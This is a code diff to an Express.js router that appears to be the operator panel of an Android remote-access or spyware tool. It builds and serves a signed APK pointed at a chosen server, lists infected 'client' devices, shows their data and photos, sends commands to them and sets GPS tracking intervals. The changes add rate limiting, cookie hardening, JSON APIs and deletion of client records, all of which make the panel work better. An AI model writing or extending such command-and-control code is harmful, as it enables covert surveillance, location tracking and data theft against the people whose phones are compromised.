@@ -10,6 +10,32 @@ const builder = require('./builder');
 
 const router = express.Router();
 
+// Rate limiting simple implementation
+const rateLimit = new Map();
+const RATE_LIMIT_WINDOW = 60000; // 1 minute
+const RATE_LIMIT_MAX = 100; // requests per window
+
+function checkRateLimit(req, res, next) {
+    const ip = req.ip || req.connection.remoteAddress;
+    const now = Date.now();
+    
+    if (!rateLimit.has(ip)) {
+        rateLimit.set(ip, { count: 1, start: now });
+    } else {
+        const entry = rateLimit.get(ip);
+        if (now - entry.start > RATE_LIMIT_WINDOW) {
+            entry.count = 1;
+            entry.start = now;
+        } else {
+            entry.count++;
+            if (entry.count > RATE_LIMIT_MAX) {
+                return res.status(429).json({ error: 'Too many requests' });
+            }
+        }
+    }
+    next();
+}
+
 // Auth middleware
 function auth(req, res, next) {
     try {
@@ -17,6 +43,10 @@ function auth(req, res, next) {
         if (req.cookies?.token === token && token) {
             next();
         } else {
+            // API requests return JSON, page requests redirect
+            if (req.xhr || req.path.startsWith('/api/')) {
+                return res.status(401).json({ error: 'Unauthorized' });
+            }
             res.redirect('/login');
         }
     } catch (e) {
@@ -30,19 +60,19 @@ function logRequest(req, res, next) {
     const start = Date.now();
     res.on('finish', () => {
         const duration = Date.now() - start;
-        const status = res.statusCode >= 400 ? 'error' : 'success';
-        if (req.path !== '/builder/progress') { // Skip progress polling
-            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${duration}ms)`, 'system');
+        if (req.path !== '/builder/progress' && !req.path.startsWith('/api/clients')) {
+            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${duration}ms)`, 'http');
         }
     });
     next();
 }
 
 router.use(logRequest);
+router.use(checkRateLimit);
 
 // Login
 router.get('/login', (req, res) => {
-    res.render('login');
+    res.render('login', { error: req.query.error });
 });
 
 router.post('/login', express.urlencoded({ extended: true }), (req, res) => {
@@ -54,10 +84,13 @@ router.post('/login', express.urlencoded({ extended: true }), (req, res) => {
         const ip = req.ip || req.connection.remoteAddress;
         
         if (user === admin.user && hash === admin.pass) {
-            const token = crypto.randomBytes(16).toString('hex');
-            db.main.get('admin').assign({ token }).write();
+            const token = crypto.randomBytes(24).toString('hex');
+            db.main.get('admin').assign({ token, lastLogin: new Date().toISOString() }).write();
             logger.loginSuccess(ip);
-            res.cookie('token', token).redirect('/');
+            res.cookie('token', token, { 
+                httpOnly: true,
+                maxAge: 24 * 60 * 60 * 1000 // 24 hours
+            }).redirect('/');
         } else {
             logger.loginFailed(ip);
             res.redirect('/login?error=1');
@@ -83,9 +116,17 @@ router.get('/logout', (req, res) => {
 // Dashboard
 router.get('/', auth, (req, res) => {
     try {
+        const online = clients.online();
+        const offline = clients.offline();
+        
         res.render('index', { 
-            online: clients.online(), 
-            offline: clients.offline() 
+            online, 
+            offline,
+            stats: {
+                total: online.length + offline.length,
+                online: online.length,
+                offline: offline.length
+            }
         });
     } catch (e) {
         logger.systemError('Dashboard render failed', e);
@@ -105,6 +146,13 @@ router.post('/builder', auth, (req, res) => {
         if (!serverUrl) {
             logger.warning('Build attempted without server URL', 'build');
             return res.json({ error: 'Server URL is required' });
+        }
+        
+        // Validate URL
+        try {
+            const url = new URL(serverUrl.startsWith('http') ? serverUrl : `http://${serverUrl}`);
+        } catch (e) {
+            return res.json({ error: 'Invalid server URL' });
         }
         
         logger.buildStart(serverUrl);
@@ -140,7 +188,7 @@ router.get('/logs', auth, (req, res) => {
             type, 
             category, 
             search, 
-            limit: limit ? parseInt(limit) : 100 
+            limit: limit ? Math.min(parseInt(limit), 1000) : 100 
         });
         const stats = getStats();
         res.render('logs', { logs, stats, filters: { type, category, search } });
@@ -177,13 +225,14 @@ router.get('/device/:id', auth, (req, res) => {
 router.get('/device/:id/:page', auth, (req, res) => {
     try {
         const { id, page } = req.params;
-        const data = clients.getData(id, page);
+        const client = clients.get(id);
         
-        if (data) {
-            res.render('device', { id, page, data });
-        } else {
-            res.render('device', { id, page: 'notfound', data: {} });
+        if (!client) {
+            return res.render('device', { id, page: 'notfound', data: {}, client: null });
         }
+        
+        const data = clients.getData(id, page) || {};
+        res.render('device', { id, page, data, client });
     } catch (e) {
         logger.systemError('Device page render failed', e);
         res.status(500).send('Internal error');
@@ -213,31 +262,34 @@ router.post('/cmd/:id/:cmd', auth, express.json(), (req, res) => {
 router.post('/gps/:id/:interval', auth, (req, res) => {
     try {
         const { id, interval } = req.params;
-        clients.setGps(id, parseInt(interval) || 0);
-        res.json({ success: true });
+        const intInterval = parseInt(interval) || 0;
+        
+        // Validate interval
+        if (intInterval < 0 || intInterval > 3600) {
+            return res.json({ error: 'Interval must be between 0 and 3600 seconds' });
+        }
+        
+        const result = clients.setGps(id, intInterval);
+        res.json({ success: result });
     } catch (e) {
         logger.systemError('GPS route failed', e);
         res.json({ error: e.message });
     }
 });
 
-// Static downloads
-router.use('/downloads', express.static(config.downloadsPath));
-router.use('/photos', express.static(config.photosPath));
-
-// Serve signed APK
-router.get('/build.s.apk', (req, res) => {
+// API: Get client data by page
+router.get('/api/client/:id/:page', auth, (req, res) => {
     try {
-        if (fs.existsSync(builder.signedApk)) {
-            logger.info('APK downloaded', 'build');
-            res.download(builder.signedApk);
+        const { id, page } = req.params;
+        const data = clients.getData(id, page);
+        
+        if (data) {
+            res.json({ success: true, data });
         } else {
-            logger.warning('APK requested but not found', 'build');
-            res.status(404).send('APK not found. Build one first using the Builder page.');
+            res.json({ error: 'Client or page not found' });
         }
     } catch (e) {
-        logger.systemError('APK download failed', e);
-        res.status(500).send('Internal error');
+        res.json({ error: e.message });
     }
 });
 
@@ -267,6 +319,75 @@ router.get('/api/client/:id', auth, (req, res) => {
         res.json({ error: e.message });
     }
 });
+
+// API: Delete client data
+router.delete('/api/client/:id', auth, (req, res) => {
+    try {
+        const id = req.params.id;
+        // Remove from database
+        db.main.get('clients').remove({ id }).write();
+        
+        // Delete client DB file
+        const clientDbPath = path.join(config.dbPath, 'clients', `${id}.json`);
+        if (fs.existsSync(clientDbPath)) {
+            fs.unlinkSync(clientDbPath);
+        }
+        
+        res.json({ success: true });
+    } catch (e) {
+        logger.systemError('Delete client failed', e);
+        res.json({ error: e.message });
+    }
+});
+
+// API: Server stats
+router.get('/api/stats', auth, (req, res) => {
+    try {
+        const stats = {
+            clients: {
+                online: clients.online().length,
+                offline: clients.offline().length,
+                total: clients.all().length
+            },
+            logs: getStats(),
+            uptime: process.uptime(),
+            memory: process.memoryUsage()
+        };
+        res.json(stats);
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// Static downloads
+router.use('/downloads', express.static(config.downloadsPath));
+router.use('/photos', express.static(config.photosPath));
+
+// Serve signed APK
+router.get('/build.s.apk', (req, res) => {
+    try {
+        if (fs.existsSync(builder.signedApk)) {
+            logger.info('APK downloaded', 'build');
+            res.download(builder.signedApk, 'app.s.apk');
+        } else {
+            logger.warning('APK requested but not found', 'build');
+            res.status(404).send('APK not found. Build one first using the Builder page.');
+        }
+    } catch (e) {
+        logger.systemError('APK download failed', e);
+        res.status(500).send('Internal error');
+    }
+});
+
+// Cleanup rate limit entries periodically
+setInterval(() => {
+    const now = Date.now();
+    for (const [ip, entry] of rateLimit.entries()) {
+        if (now - entry.start > RATE_LIMIT_WINDOW * 2) {
+            rateLimit.delete(ip);
+        }
+    }
+}, 60000);
 
 // Error handler
 router.use((err, req, res, next) => {
